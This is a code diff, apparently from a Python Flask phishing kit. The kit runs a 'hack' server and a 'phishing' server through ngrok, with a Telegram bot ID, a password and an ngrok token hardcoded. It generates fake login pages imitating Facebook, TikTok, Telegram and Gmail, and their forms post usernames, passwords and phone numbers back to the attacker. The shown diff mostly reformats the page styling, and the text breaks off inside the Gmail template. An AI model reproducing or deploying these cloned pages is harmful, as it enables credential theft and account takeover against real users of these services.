@@ -21,9 +21,6 @@ import urllib3
 # DISABLE SSL WARNINGS
 # ================================
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-requests.packages.urllib3.disable_warnings()
-import warnings
-warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 # ================================
 # CONFIGURATION
@@ -33,6 +30,7 @@ TELEGRAM_ID = "1530069749"
 BOT_PASSWORD = "Mh4ck25"
 NGROK_AUTHTOKEN = "340dUdKAsQd8xPxkSZgVCf0sR1b_4r1gQ2ya1iVXBuSWyJKcF"
 
+# Flask servers configuration
 HACK_SERVER_PORT = 5000
 PHISHING_SERVER_PORT = 8080
 
@@ -55,49 +53,28 @@ tracking_data = {}
 active_chat_ids = set()
 current_phishing_page = "facebook"
 
+# Store ngrok URLs
 hack_ngrok_url = None
 phishing_ngrok_url = None
 
 # ================================
 # FIX TEMPLATE DIRECTORY ISSUE
 # ================================
+# Get the current directory
 current_dir = os.path.dirname(os.path.abspath(__file__))
 templates_dir = os.path.join(current_dir, 'templates')
 
 print(f"📁 Current directory: {current_dir}")
 print(f"📁 Templates directory: {templates_dir}")
 
+# Create templates directory if it doesn't exist
 if not os.path.exists(templates_dir):
     print(f"📁 Creating templates directory: {templates_dir}")
     os.makedirs(templates_dir, exist_ok=True)
 
+# Create Flask apps with explicit template folder
 hack_app = Flask(__name__)
 phishing_app = Flask(__name__, template_folder=templates_dir)
-
-# ================================
-# IMPROVED ERROR HANDLING & 404 PREVENTION
-# ================================
-@hack_app.errorhandler(404)
-def hack_not_found(e):
-    """Handle 404 errors for hack server"""
-    print(f"⚠️ Hack 404: {request.url}")
-    return redirect(f"{hack_ngrok_url if hack_ngrok_url else 'https://google.com'}")
-
-@phishing_app.errorhandler(404)
-def phishing_not_found(e):
-    """Handle 404 errors for phishing server"""
-    print(f"⚠️ Phishing 404: {request.url}")
-    return redirect(f"{phishing_ngrok_url if phishing_ngrok_url else 'https://google.com'}")
-
-@hack_app.before_request
-def hack_before_request():
-    """Log all hack server requests"""
-    print(f"📍 Hack Request: {request.method} {request.path}")
-
-@phishing_app.before_request
-def phishing_before_request():
-    """Log all phishing server requests"""
-    print(f"📍 Phishing Request: {request.method} {request.path}")
 
 # ================================
 # CREATE DEFAULT TEMPLATES IF MISSING
@@ -113,28 +90,174 @@ def create_default_templates():
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook - Log In or Sign Up</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #1c1e21; line-height: 1.34; font-size: 14px; padding: 0; margin: 0; height: 100vh; display: flex; flex-direction: column; }
-        .container { flex: 1; display: flex; flex-direction: column; padding: 16px; max-width: 480px; margin: 0 auto; width: 100%; }
-        .header { text-align: center; margin: 20px 0 30px 0; }
-        .logo { width: 55px; height: 84px; margin: 0 auto; }
-        .card { background: white; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); padding: 16px; margin-bottom: 16px; width: 100%; }
-        .form-group { margin-bottom: 12px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border-radius: 6px; border: 1px solid #dddfe2; font-size: 16px; background: white; color: #1c1e21; font-family: inherit; }
-        input::placeholder { color: #8a8d91; }
-        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; outline: none; }
-        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; font-size: 18px; color: white; font-weight: bold; padding: 12px; width: 100%; margin-bottom: 16px; cursor: pointer; font-family: inherit; }
-        .login-btn:active { background-color: #166fe5; transform: scale(0.98); }
-        .forgot-password { color: #1877f2; text-align: center; display: block; text-decoration: none; font-size: 14px; margin-bottom: 16px; font-weight: 500; }
-        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
-        .create-account { background-color: #42b72a; border: none; border-radius: 6px; font-size: 16px; color: white; font-weight: bold; padding: 12px 16px; margin: 0 auto; display: block; cursor: pointer; font-family: inherit; }
-        .create-account:active { background-color: #36a420; transform: scale(0.98); }
-        .get-app { text-align: center; margin: 20px 0; font-size: 14px; color: #1c1e21; line-height: 1.5; }
-        .language-select { text-align: center; margin: 15px 0; font-size: 14px; color: #737373; font-weight: 500; }
-        .footer { text-align: center; padding: 16px; background: white; margin-top: auto; }
-        .footer-links { font-size: 12px; color: #737373; line-height: 1.6; }
-        .footer-links a { color: #737373; text-decoration: none; margin: 0 4px; }
-        .meta-logo { margin-top: 12px; font-size: 12px; color: #737373; font-weight: bold; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 16px;
+            max-width: 480px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin: 20px 0 30px 0;
+        }
+        .logo {
+            width: 55px;
+            height: 84px;
+            margin: 0 auto;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            padding: 16px;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 16px;
+            background: white;
+            color: #1c1e21;
+            font-family: inherit;
+        }
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #8a8d91;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            color: white;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .login-btn:active {
+            background-color: #166fe5;
+            transform: scale(0.98);
+        }
+        .forgot-password {
+            color: #1877f2;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+            padding: 12px 16px;
+            margin: 0 auto;
+            display: block;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .create-account:active {
+            background-color: #36a420;
+            transform: scale(0.98);
+        }
+        .get-app {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #1c1e21;
+            line-height: 1.5;
+        }
+        .language-select {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #737373;
+            font-weight: 500;
+        }
+        .footer {
+            text-align: center;
+            padding: 16px;
+            background: white;
+            margin-top: auto;
+        }
+        .footer-links {
+            font-size: 12px;
+            color: #737373;
+            line-height: 1.6;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+        .meta-logo {
+            margin-top: 12px;
+            font-size: 12px;
+            color: #737373;
+            font-weight: bold;
+        }
+        @media (max-width: 320px) {
+            .container {
+                padding: 12px;
+            }
+            .card {
+                padding: 12px;
+            }
+            input[type="text"],
+            input[type="password"] {
+                padding: 12px 14px;
+                font-size: 15px;
+            }
+            .login-btn {
+                font-size: 16px;
+                padding: 11px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -160,22 +283,51 @@ def create_default_templates():
             </form>
         </div>
 
-        <div class="get-app">Get Facebook for browse faster.</div>
-        <div class="language-select">English (US)</div>
+        <div class="get-app">
+            Get Facebook for browse faster.
+        </div>
+
+        <div class="language-select">
+            English (US)
+        </div>
     </div>
 
     <div class="footer">
         <div class="footer-links">
-            <a href="#">Sign Up</a> • <a href="#">Log In</a> • <a href="#">Messenger</a> • <a href="#">Facebook Lite</a> • 
-            <a href="#">Video</a> • <a href="#">Places</a> • <a href="#">Games</a> • <a href="#">Marketplace</a> • 
-            <a href="#">Meta Pay</a> • <a href="#">Meta Store</a> • <a href="#">Meta Quest</a> • <a href="#">Instagram</a> • 
-            <a href="#">Threads</a> • <a href="#">Fundraisers</a> • <a href="#">Services</a> • <a href="#">Voting Information Center</a> • 
-            <a href="#">Privacy Policy</a> • <a href="#">Privacy Center</a> • <a href="#">Groups</a> • <a href="#">About</a> • 
-            <a href="#">Create Ad</a> • <a href="#">Create Page</a> • <a href="#">Developers</a> • <a href="#">Careers</a> • 
-            <a href="#">Cookies</a> • <a href="#">Ad choices</a> • <a href="#">Terms</a> • <a href="#">Help</a> • 
+            <a href="#">Sign Up</a> • 
+            <a href="#">Log In</a> • 
+            <a href="#">Messenger</a> • 
+            <a href="#">Facebook Lite</a> • 
+            <a href="#">Video</a> • 
+            <a href="#">Places</a> • 
+            <a href="#">Games</a> • 
+            <a href="#">Marketplace</a> • 
+            <a href="#">Meta Pay</a> • 
+            <a href="#">Meta Store</a> • 
+            <a href="#">Meta Quest</a> • 
+            <a href="#">Instagram</a> • 
+            <a href="#">Threads</a> • 
+            <a href="#">Fundraisers</a> • 
+            <a href="#">Services</a> • 
+            <a href="#">Voting Information Center</a> • 
+            <a href="#">Privacy Policy</a> • 
+            <a href="#">Privacy Center</a> • 
+            <a href="#">Groups</a> • 
+            <a href="#">About</a> • 
+            <a href="#">Create Ad</a> • 
+            <a href="#">Create Page</a> • 
+            <a href="#">Developers</a> • 
+            <a href="#">Careers</a> • 
+            <a href="#">Cookies</a> • 
+            <a href="#">Ad choices</a> • 
+            <a href="#">Terms</a> • 
+            <a href="#">Help</a> • 
             <a href="#">Contact Uploading & Non-Users</a>
         </div>
-        <div class="meta-logo">Meta © 2025</div>
+        
+        <div class="meta-logo">
+            Meta © 2025
+        </div>
     </div>
 </body>
 </html>"""
@@ -189,36 +341,202 @@ def create_default_templates():
     <title>TikTok</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #000000; color: #ffffff; line-height: 1.34; font-size: 14px; padding: 0; margin: 0; height: 100vh; display: flex; flex-direction: column; }
-        .container { flex: 1; display: flex; flex-direction: column; padding: 16px; max-width: 400px; margin: 0 auto; width: 100%; }
-        .header { text-align: center; margin: 40px 0 30px 0; }
-        .logo { width: 80px; height: 80px; margin: 0 auto 20px auto; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #ff0050, #00f2ea); }
-        .logo i { font-size: 40px; color: white; }
-        .tiktok-text { font-size: 32px; font-weight: bold; color: #ffffff; margin-bottom: 30px; }
-        .card { background: #121212; border: 1px solid #333333; border-radius: 12px; padding: 20px; margin-bottom: 16px; width: 100%; }
-        .form-group { margin-bottom: 16px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #333333; font-size: 16px; background: #000000; color: #ffffff; font-family: inherit; }
-        input::placeholder { color: #888888; }
-        input:focus { border-color: #ff0050; outline: none; }
-        .login-btn { background-color: #ff0050; border: none; border-radius: 8px; font-size: 16px; color: white; font-weight: bold; padding: 14px; width: 100%; margin-bottom: 16px; cursor: pointer; font-family: inherit; transition: background-color 0.3s; }
-        .login-btn:hover { background-color: #e00045; }
-        .login-btn:active { transform: scale(0.98); }
-        .divider { display: flex; align-items: center; margin: 20px 0; color: #888888; font-size: 14px; }
-        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #333333; }
-        .divider::before { margin-right: 16px; }
-        .divider::after { margin-left: 16px; }
-        .other-options { text-align: center; margin-bottom: 20px; }
-        .option-link { color: #ff0050; text-decoration: none; font-size: 14px; display: block; margin-bottom: 12px; }
-        .signup-section { background: #121212; border: 1px solid #333333; border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 16px; }
-        .signup-text { color: #ffffff; font-size: 14px; }
-        .signup-link { color: #ff0050; text-decoration: none; font-weight: 600; }
-        .footer { text-align: center; padding: 20px; margin-top: auto; color: #888888; font-size: 12px; }
-        .footer-links { margin-bottom: 10px; }
-        .footer-links a { color: #888888; text-decoration: none; margin: 0 8px; }
-        .social-login { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
-        .social-btn { width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #333333; color: white; text-decoration: none; font-size: 18px; transition: transform 0.3s; }
-        .social-btn:hover { transform: scale(1.1); }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            line-height: 1.34;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 16px;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin: 40px 0 30px 0;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px auto;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+        }
+        .logo i {
+            font-size: 40px;
+            color: white;
+        }
+        .tiktok-text {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffffff;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: #121212;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 8px;
+            border: 1px solid #333333;
+            font-size: 16px;
+            background: #000000;
+            color: #ffffff;
+            font-family: inherit;
+        }
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #888888;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #ff0050;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #ff0050;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background-color 0.3s;
+        }
+        .login-btn:hover {
+            background-color: #e00045;
+        }
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #888888;
+            font-size: 14px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #333333;
+        }
+        .divider::before {
+            margin-right: 16px;
+        }
+        .divider::after {
+            margin-left: 16px;
+        }
+        .other-options {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .option-link {
+            color: #ff0050;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 12px;
+        }
+        .signup-section {
+            background: #121212;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .signup-text {
+            color: #ffffff;
+            font-size: 14px;
+        }
+        .signup-link {
+            color: #ff0050;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: auto;
+            color: #888888;
+            font-size: 12px;
+        }
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #888888;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .language-selector {
+            margin-top: 10px;
+        }
+        .language-selector select {
+            background: #000000;
+            color: #ffffff;
+            border: 1px solid #333333;
+            border-radius: 4px;
+            padding: 4px 8px;
+        }
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .social-btn {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #333333;
+            color: white;
+            text-decoration: none;
+            font-size: 18px;
+            transition: transform 0.3s;
+        }
+        .social-btn:hover {
+            transform: scale(1.1);
+        }
         .facebook { background: #1877f2; }
         .google { background: #db4437; }
         .twitter { background: #1da1f2; }
@@ -227,7 +545,9 @@ def create_default_templates():
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo"><i class="fab fa-tiktok"></i></div>
+            <div class="logo">
+                <i class="fab fa-tiktok"></i>
+            </div>
             <div class="tiktok-text">TikTok</div>
         </div>
 
@@ -265,7 +585,18 @@ def create_default_templates():
 
     <div class="footer">
         <div class="footer-links">
-            <a href="#">About</a> <a href="#">Newsroom</a> <a href="#">Contact</a> <a href="#">Careers</a> <a href="#">ByteDance</a>
+            <a href="#">About</a>
+            <a href="#">Newsroom</a>
+            <a href="#">Contact</a>
+            <a href="#">Careers</a>
+            <a href="#">ByteDance</a>
+        </div>
+        <div class="language-selector">
+            <select>
+                <option>English</option>
+                <option>ខ្មែរ</option>
+                <option>中文</option>
+            </select>
         </div>
         <div>© 2025 TikTok</div>
     </div>
@@ -280,36 +611,211 @@ def create_default_templates():
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; color: #000000; line-height: 1.4; font-size: 14px; padding: 0; margin: 0; height: 100vh; }
-        .container { padding: 20px; max-width: 400px; margin: 0 auto; }
-        .header { text-align: center; margin: 40px 0 30px 0; }
-        .logo { width: 64px; height: 64px; margin: 0 auto 15px auto; color: #37AEE2; }
-        .title { font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #000000; }
-        .subtitle { font-size: 14px; color: #707579; line-height: 1.4; margin-bottom: 25px; }
-        .form-section { margin-bottom: 25px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 6px; font-weight: 500; color: #000000; font-size: 14px; }
-        .country-selector { width: 100%; padding: 12px; border: 1px solid #E0E0E0; border-radius: 8px; font-size: 14px; background: #ffffff; color: #000000; appearance: none; background-image: url("data:image/svg+xml;charset=US-ASCII,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'><path fill='%23666' d='m0 1 2 2 2-2z'/></svg>"); background-repeat: no-repeat; background-position: right 12px center; background-size: 10px; }
-        .phone-input-container { position: relative; width: 100%; }
-        .phone-input { width: 100%; padding: 12px 12px 12px 70px; border: 1px solid #E0E0E0; border-radius: 8px; font-size: 14px; background: #ffffff; color: #000000; }
-        .phone-input::placeholder { color: #999; }
-        .country-code-display { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #000000; font-size: 14px; font-weight: 500; pointer-events: none; }
-        .separator { position: absolute; left: 55px; top: 50%; transform: translateY(-50%); color: #E0E0E0; font-size: 14px; pointer-events: none; }
-        .checkbox-group { display: flex; align-items: center; margin: 20px 0; }
-        .checkbox { width: 18px; height: 18px; border: 2px solid #37AEE2; border-radius: 3px; margin-right: 10px; position: relative; cursor: pointer; }
-        .checkbox.checked { background-color: #37AEE2; }
-        .checkbox.checked::after { content: "✓"; color: white; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 12px; font-weight: bold; }
-        .checkbox-label { font-size: 14px; color: #000000; cursor: pointer; }
-        .login-btn { background-color: #37AEE2; border: none; border-radius: 8px; font-size: 16px; color: white; font-weight: 600; padding: 14px; width: 100%; cursor: pointer; transition: background-color 0.2s; }
-        .login-btn:active { background-color: #2a8dbd; }
-        .qr-section { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #E0E0E0; }
-        .qr-title { font-size: 14px; color: #37AEE2; font-weight: 500; margin-bottom: 8px; }
-        .qr-subtitle { font-size: 12px; color: #707579; line-height: 1.4; }
-        .footer { text-align: center; margin-top: 25px; padding: 15px; }
-        .footer-text { font-size: 12px; color: #707579; line-height: 1.4; }
-        .footer-link { color: #37AEE2; text-decoration: none; }
-        input:focus, select:focus { outline: none; border-color: #37AEE2; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #000000;
+            line-height: 1.4;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+        }
+        .container {
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin: 40px 0 30px 0;
+        }
+        .logo {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 15px auto;
+            color: #37AEE2;
+        }
+        .title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #000000;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #707579;
+            line-height: 1.4;
+            margin-bottom: 25px;
+        }
+        .form-section {
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            color: #000000;
+            font-size: 14px;
+        }
+        .country-selector {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #ffffff;
+            color: #000000;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=US-ASCII,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'><path fill='%23666' d='m0 1 2 2 2-2z'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 10px;
+        }
+        .phone-input-container {
+            position: relative;
+            width: 100%;
+        }
+        .phone-input {
+            width: 100%;
+            padding: 12px 12px 12px 70px;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #ffffff;
+            color: #000000;
+        }
+        .phone-input::placeholder {
+            color: #999;
+        }
+        .country-code-display {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #000000;
+            font-size: 14px;
+            font-weight: 500;
+            pointer-events: none;
+        }
+        .separator {
+            position: absolute;
+            left: 55px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #E0E0E0;
+            font-size: 14px;
+            pointer-events: none;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #37AEE2;
+            border-radius: 3px;
+            margin-right: 10px;
+            position: relative;
+            cursor: pointer;
+        }
+        .checkbox.checked {
+            background-color: #37AEE2;
+        }
+        .checkbox.checked::after {
+            content: "✓";
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .checkbox-label {
+            font-size: 14px;
+            color: #000000;
+            cursor: pointer;
+        }
+        .login-btn {
+            background-color: #37AEE2;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            color: white;
+            font-weight: 600;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-btn:active {
+            background-color: #2a8dbd;
+        }
+        .qr-section {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #E0E0E0;
+        }
+        .qr-title {
+            font-size: 14px;
+            color: #37AEE2;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .qr-subtitle {
+            font-size: 12px;
+            color: #707579;
+            line-height: 1.4;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding: 15px;
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #707579;
+            line-height: 1.4;
+        }
+        .footer-link {
+            color: #37AEE2;
+            text-decoration: none;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #37AEE2;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            .header {
+                margin: 30px 0 20px 0;
+            }
+            .logo {
+                width: 56px;
+                height: 56px;
+            }
+            .title {
+                font-size: 16px;
+            }
+            .subtitle {
+                font-size: 13px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -321,7 +827,9 @@ def create_default_templates():
                 </svg>
             </div>
             <div class="title">Telegram</div>
-            <div class="subtitle">Please confirm your country code and enter your phone number.</div>
+            <div class="subtitle">
+                Please confirm your country code and enter your phone number.
+            </div>
         </div>
 
         <form action="/login" method="POST">
@@ -341,7 +849,8 @@ def create_default_templates():
                     <div class="phone-input-container">
                         <span class="country-code-display" id="countryCodeDisplay">+855</span>
                         <span class="separator">|</span>
-                        <input type="tel" class="phone-input" name="username" id="phone_number" placeholder="Phone number" required pattern="[0-9]{7,15}">
+                        <input type="tel" class="phone-input" name="username" id="phone_number" 
+                               placeholder="Phone number" required pattern="[0-9]{7,15}">
                         <input type="hidden" name="password" id="countryCode" value="+855">
                     </div>
                 </div>
@@ -358,12 +867,16 @@ def create_default_templates():
 
         <div class="qr-section">
             <div class="qr-title">LOG IN BY QR CODE</div>
-            <div class="qr-subtitle">Open Telegram on your phone and go to<br>Settings > Devices > Scan QR Code</div>
+            <div class="qr-subtitle">
+                Open Telegram on your phone and go to<br>
+                Settings > Devices > Scan QR Code
+            </div>
         </div>
 
         <div class="footer">
             <div class="footer-text">
-                By signing in, you agree to our <a href="#" class="footer-link">Terms of Service</a> and <a href="#" class="footer-link">Privacy Policy</a>.
+                By signing in, you agree to our <a href="#" class="footer-link">Terms of Service</a> 
+                and <a href="#" class="footer-link">Privacy Policy</a>.
             </div>
         </div>
     </div>
@@ -375,7 +888,11 @@ def create_default_templates():
         });
 
         document.getElementById('country').addEventListener('change', function() {
-            const countryCodes = {'Cambodia': '+855','United States': '+1','United Kingdom': '+44'};
+            const countryCodes = {
+                'Cambodia': '+855',
+                'United States': '+1',
+                'United Kingdom': '+44'
+            };
             const selectedCountry = this.value;
             const countryCode = countryCodes[selectedCountry] || '+855';
             document.getElementById('countryCodeDisplay').textContent = countryCode;
@@ -401,32 +918,197 @@ def create_default_templates():
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Gmail</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Google Sans', Arial, sans-serif; background-color: #ffffff; color: #202124; line-height: 1.4286; font-size: 14px; padding: 0; margin: 0; height: 100vh; display: flex; flex-direction: column; }
-        .container { flex: 1; display: flex; flex-direction: column; max-width: 450px; margin: 0 auto; width: 100%; padding: 20px; }
-        .header { text-align: center; margin: 40px 0 30px 0; }
-        .logo { width: 75px; height: 75px; margin: 0 auto 20px auto; background: conic-gradient(from -45deg, #ea4335, #4285f4, #34a853, #fbbc05, #ea4335); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: white; font-weight: bold; }
-        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
-        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 40px; }
-        .card { background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 40px 36px; margin-bottom: 16px; width: 100%; }
-        .form-group { margin-bottom: 24px; }
-        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; border-radius: 4px; border: 1px solid #dadce0; font-size: 16px; background: white; color: #202124; font-family: inherit; transition: border 0.2s; }
-        input::placeholder { color: #5f6368; }
-        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px #e8f0fe; }
-        .login-btn, .next-btn { background-color: #1a73e8; border: none; border-radius: 4px; font-size: 14px; color: white; font-weight: 500; padding: 10px 24px; margin: 8px 0; cursor: pointer; font-family: inherit; float: right; transition: background-color 0.2s; }
-        .login-btn:hover, .next-btn:hover { background-color: #1669d6; }
-        .login-btn:active, .next-btn:active { background-color: #1a73e8; transform: scale(0.98); }
-        .forgot-password { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; display: inline-block; margin-top: 8px; }
-        .forgot-password:hover { text-decoration: underline; }
-        .help-section { text-align: center; margin-top: 40px; color: #5f6368; font-size: 14px; }
-        .help-link { color: #1a73e8; text-decoration: none; font-weight: 500; }
-        .help-link:hover { text-decoration: underline; }
-        .footer { text-align: center; padding: 24px; margin-top: auto; border-top: 1px solid #dadce0; }
-        .footer-links { font-size: 12px; color: #5f6368; line-height: 1.6; margin-bottom: 10px; }
-        .footer-links a { color: #5f6368; text-decoration: none; margin: 0 8px; }
-        .footer-links a:hover { text-decoration: underline; }
-        .create-account { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; display: inline-block; margin-top: 16px; }
-        .create-account:hover { text-decoration: underline; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
